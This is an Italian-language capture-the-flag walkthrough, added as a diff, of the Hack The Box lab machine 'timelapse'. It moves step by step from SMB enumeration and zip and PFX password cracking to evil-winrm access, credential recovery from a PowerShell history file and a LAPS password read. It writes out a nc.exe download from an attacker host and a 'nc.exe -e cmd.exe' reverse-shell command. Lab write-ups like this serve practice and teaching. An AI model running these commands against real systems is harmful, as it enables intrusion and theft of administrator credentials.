@@ -1,0 +1,255 @@
+analizzo ldap per prima cosa 
+
+non trovo info particolarmente utili
+
+provo smb
+
+smbclient -L //10.10.11.152
+
+ smbclient -L //10.10.11.152                                                                                                                                                                                                       130 ⨯
+Enter WORKGROUP\kali's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	Shares          Disk      
+	SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+
+
+smbclient //10.10.11.152/Shares
+
+
+smbclient //10.10.11.152/Shares 
+Enter WORKGROUP\kali's password: 
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Mon Oct 25 11:39:15 2021
+  ..                                  D        0  Mon Oct 25 11:39:15 2021
+  Dev                                 D        0  Mon Oct 25 15:40:06 2021
+  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021
+
+		6367231 blocks of size 4096. 1298232 blocks available
+smb: \> dir Dev
+  Dev                                 D        0  Mon Oct 25 15:40:06 2021
+
+		6367231 blocks of size 4096. 1298355 blocks available
+smb: \> cd Dev
+smb: \Dev\> dir
+  .                                   D        0  Mon Oct 25 15:40:06 2021
+  ..                                  D        0  Mon Oct 25 15:40:06 2021
+  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021
+
+		6367231 blocks of size 4096. 1298861 blocks available
+smb: \Dev\> get winrm_backup.zip
+getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (9.2 KiloBytes/sec) (average 9.2 KiloBytes/sec)
+smb: \Dev\> cd ..
+smb: \> cd helpDesk
+smb: \helpDesk\> dir
+  .                                   D        0  Mon Oct 25 11:48:42 2021
+  ..                                  D        0  Mon Oct 25 11:48:42 2021
+  LAPS.x64.msi                        A  1118208  Mon Oct 25 10:57:50 2021
+  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 10:57:46 2021
+  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 10:57:40 2021
+  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 10:57:44 2021
+
+		6367231 blocks of size 4096. 1300161 blocks available
+smb: \helpDesk\> get *
+NT_STATUS_OBJECT_NAME_INVALID opening remote file \helpDesk\*
+smb: \helpDesk\> get LAPS.x64.msi
+getting file \helpDesk\LAPS.x64.msi of size 1118208 as LAPS.x64.msi (674.9 KiloBytes/sec) (average 577.9 KiloBytes/sec)
+smb: \helpDesk\> get LAPS_Datasheet.docx
+getting file \helpDesk\LAPS_Datasheet.docx of size 104422 as LAPS_Datasheet.docx (248.7 KiloBytes/sec) (average 519.3 KiloBytes/sec)
+smb: \helpDesk\> get LAPS_OperationsGuide.docx
+getting file \helpDesk\LAPS_OperationsGuide.docx of size 641378 as LAPS_OperationsGuide.docx (820.9 KiloBytes/sec) (average 594.3 KiloBytes/sec)
+smb: \helpDesk\> get LAPS_TechnicalSpecification.docx
+getting file \helpDesk\LAPS_TechnicalSpecification.docx of size 72683 as LAPS_TechnicalSpecification.docx (155.3 KiloBytes/sec) (average 537.4 KiloBytes/sec)
+smb: \helpDesk\> 
+
+
+i files docx parlano di un sistema di gestione delle pwd di admin che sono random e cambiano ogni tot
+il file .zip richiede pwd per essere aperto provo a crackarla
+
+
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip                                                                                                                                                              127 ⨯
+
+
+PASSWORD FOUND!!!!: pw == supremelegacy
+
+
+dentro c'è il file legacyy_dev_auth.pfx
+
+The . pfx file, which is in a PKCS#12 format, contains the SSL certificate (public keys) and the corresponding private keys
+
+
+se riesco ad estrarre public e private key posso usarle con evil-winrm
+
+posso usare: https://github.com/crackpkcs12/crackpkcs12
+
+
+crackpkcs12 -d /usr/share/wordlists/rockyou.txt legacyy_dev_auth.pfx 
+
+Dictionary attack - Starting 4 threads
+
+
+*********************************************************
+Dictionary attack - Thread 4 - Password found: thuglegacy
+*********************************************************
+
+ora posso estrarre chiave privata e pubblica con openssl
+
+openssl pkcs12 -in legacyy_dev_auth.pfx  -clcerts -nokeys -out cert_legacy.crt
+openssl pkcs12 -in legacyy_dev_auth.pfx  -nocerts -out private_legacy.key
+
+
+
+evil-winrm -S -c cert_legacy.crt -k private_legacy.key -i 10.10.11.152
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Warning: SSL enabled
+
+Info: Establishing connection to remote endpoint
+
+Enter PEM pass phrase:
+*Evil-WinRM* PS C:\Users\legacyy\Documents> 
+
+
+*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
+timelapse\legacyy
+
+
+*Evil-WinRM* PS C:\Users\legacyy\Desktop> dir
+
+
+    Directory: C:\Users\legacyy\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---         6/2/2022  10:33 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\legacyy\Desktop> type user.txt
+02f9adb73cd81fbcf3beef77df6913af
+
+
+
+
+ora probabilmente devo provare a prendere la pwd di administrator sfruttando i documenti su LAPS che ho trovato su smb 
+
+
+
+
+tra i vari utenti della macchina c'è svc_deploy
+
+*Evil-WinRM* PS C:\Users\legacyy\Desktop> net user svc_deploy
+Enter PEM pass phrase:
+User name                    svc_deploy
+Full Name                    svc_deploy
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/25/2021 12:12:37 PM
+Password expires             Never
+Password changeable          10/26/2021 12:12:37 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   10/25/2021 12:25:53 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *LAPS_Readers         *Domain Users
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\legacyy\Desktop> 
+
+
+fa parte dei LAPS_Readers quindi magari puo vedere la pwd
+
+
+
+leggendo i file nella hme dir di legacyy riesco ad arrivare a un file di history di powershell, in cui trovo le credenziali di svc_deploy
+
+
+*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine> type ConsoleHost_history.txt
+whoami
+ipconfig /all
+netstat -ano |select-string LIST
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
+get-aduser -filter * -properties *
+exit
+
+
+
+a questo punto posso accedere usando di nuovo evil-winrm o eseguire gli stessi comandi per  diventare svc_deploy
+
+
+mi passo nc.exe sulla macchina cosi eseguo un comando per la reverse shell al posto di whoami 
+
+powershell -c "Invoke-WebRequest -Uri http://10.10.14.10/nc.exe -OutFile nc.exe"
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {cmd.exe /c nc.exe -e cmd.exe 10.10.14.10 8080}
+
+nc viene cancellato forse dall'antivirus, non riesco a prendere reverse shell con comando powershell
+
+comunque posso eseguire i comandi singolarmente come svc_deploy
+
+https://thesleepyadmins.com/2021/02/06/checking-laps-password-cross-forest-using-powershell/
+
+
+
+
+*Evil-WinRM* PS C:\Users\legacyy\Documents> invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {get-adcomputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd' , 'ms-mcs-admpwdexpirationtime'}
+Enter PEM pass phrase:
+
+
+PSComputerName              : localhost
+RunspaceId                  : 40c53985-6ea6-44c9-a3af-0647089f7f89
+DistinguishedName           : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
+DNSHostName                 : dc01.timelapse.htb
+Enabled                     : True
+ms-mcs-admpwd               : Z7$n[sUrsWb4VV,pUF&,&W!C
+ms-mcs-admpwdexpirationtime : 132990967737774592
+Name                        : DC01
+ObjectClass                 : computer
+ObjectGUID                  : 6e10b102-6936-41aa-bb98-bed624c9b98f
+SamAccountName              : DC01$
+SID                         : S-1-5-21-671920749-559770252-3318990721-1000
+UserPrincipalName           :
+
+
+
+
+
+ora posso accedere come administrator con evil-winrm 
+
+
+evil-winrm -S -i 10.10.11.152 -u administrator -p 'Z7$n[sUrsWb4VV,pUF&,&W!C'
+
+
+*Evil-WinRM* PS C:\Users\TRX\Desktop> type root.txt
+e44ae07bd36bbd4c7e3fa85a0eaa0372
